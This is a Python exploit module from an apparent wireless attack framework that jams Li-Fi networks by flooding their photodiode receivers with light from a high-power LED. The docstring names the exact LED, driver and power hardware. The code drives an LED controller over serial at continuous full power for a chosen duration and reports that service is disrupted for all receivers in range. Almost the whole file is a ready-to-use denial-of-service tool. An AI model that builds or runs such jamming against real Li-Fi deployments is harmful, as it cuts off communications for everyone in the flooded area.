# Author: André Henrique (LinkedIn/X: @mrhenrike)
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Li-Fi Jamming via Light Flood (Denial of Service).

    Li-Fi receivers use photodiodes that operate within a specific
    dynamic range.  By flooding the receiver with intense light at
    the same wavelength (or broadband white light), the photodiode
    saturates, making it unable to distinguish the modulated data
    signal from the noise floor.

    This is the optical equivalent of RF jamming; it causes
    complete denial of service for Li-Fi communications in the
    affected area.

    Hardware requirements:
    - High-power LED module: 5W+ at the target wavelength
      (e.g., Cree XHP70 for white, Osram OSLON for specific
      wavelengths like 450nm blue)
    - LED driver with PWM control (e.g., MeanWell LDD-H series)
    - 12-48V power supply depending on LED
    - Optional: focusing lens or reflector to direct the light
    - Mounting hardware for sustained operation

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Li-Fi Jamming via Light Flood DoS",
        "description": (
            "Saturates Li-Fi photodiode receivers by flooding with "
            "intense light, causing denial of service.  Requires "
            "high-power LED module (5W+ Cree XHP70 or Osram OSLON) "
            "at the Li-Fi wavelength, LED driver with PWM control, "
            "and appropriate power supply.  Affects all Li-Fi "
            "communications within the flood area."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://ieeexplore.ieee.org/document/9755267",
            "https://standards.ieee.org/ieee/802.11bb/10823/",
        ),
        "disclosure_date": "2023-06-01",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "Li-Fi deployments within line-of-sight of attacker",
            "IEEE 802.11bb OOK, OFDM, and VPPM Li-Fi systems",
        ),
    }

    target = OptIP("", "Target location or Li-Fi access point ID")
    port = OptPort(1, "Not used (optical attack)")
    timeout = OptFloat(30.0, "Jamming duration in seconds")
    led_device = OptString("/dev/ttyUSB0", "LED driver serial control device or 'simulate'")
    led_power_watts = OptFloat(10.0, "LED power in watts")
    wavelength = OptInteger(450, "LED wavelength in nm (0=broadband white)")
    pwm_frequency = OptInteger(0, "PWM frequency in Hz (0=continuous DC for max saturation)")
    duty_cycle = OptFloat(100.0, "PWM duty cycle percentage (100=always on)")

    _MIN_JAM_POWER = 3.0
    _MAX_JAM_POWER = 100.0

    def _validate_params(self) -> bool:
        power = float(self.led_power_watts)
        return self._MIN_JAM_POWER <= power <= self._MAX_JAM_POWER

    def _send_led_command(self, command: str) -> bool:
        """Send command to LED driver via serial."""
        if str(self.led_device) == "simulate":
            return True
        try:
            with open(str(self.led_device), "wb") as f:
                f.write(command.encode() + b"\n")
            return True
        except OSError:
            return False

    def _start_flood(self) -> bool:
        """Turn on LED at maximum configured power."""
        pwm = int(self.pwm_frequency)
        duty = float(self.duty_cycle)

        if pwm > 0:
            cmd = f"PWM:{pwm}:{duty:.1f}"
        else:
            cmd = "DC:ON:100"

        return self._send_led_command(cmd)

    def _stop_flood(self) -> bool:
        """Turn off LED."""
        return self._send_led_command("DC:OFF:0")

    @mute
    def check(self) -> bool:
        """Verify LED driver is accessible."""
        if str(self.led_device) == "simulate":
            return True
        try:
            with open(str(self.led_device), "rb"):
                return True
        except OSError:
            return False

    def run(self) -> None:
        if not self._validate_params():
            print_error(
                f"LED power {self.led_power_watts}W outside range "
                f"({self._MIN_JAM_POWER}-{self._MAX_JAM_POWER}W)"
            )
            return

        print_success(
            f"Li-Fi light flood jamming: {self.led_power_watts}W "
            f"at {self.wavelength}nm for {self.timeout}s"
        )
        self._exploit()

    def _exploit(self) -> None:
        wl = int(self.wavelength)
        wl_desc = f"{wl}nm" if wl > 0 else "broadband white"

        print_status(
            f"Starting light flood: {self.led_power_watts}W {wl_desc}, "
            f"PWM: {'DC continuous' if int(self.pwm_frequency) == 0 else f'{self.pwm_frequency}Hz @ {self.duty_cycle}%'}"
        )

        if not self._start_flood():
            print_error("Failed to activate LED driver")
            return

        print_info(
            f"Flooding for {self.timeout} seconds. "
            "Li-Fi receivers in the affected area will experience "
            "photodiode saturation and complete signal loss."
        )

        start = time.monotonic()
        while time.monotonic() - start < float(self.timeout):
            remaining = float(self.timeout) - (time.monotonic() - start)
            if remaining > 10:
                time.sleep(5)
                print_status(f"Jamming active ({remaining:.0f}s remaining)")
            else:
                time.sleep(remaining)
                break

        self._stop_flood()
        print_success(
            f"Light flood complete after {self.timeout}s. "
            "Li-Fi service disrupted for all receivers in range."
        )
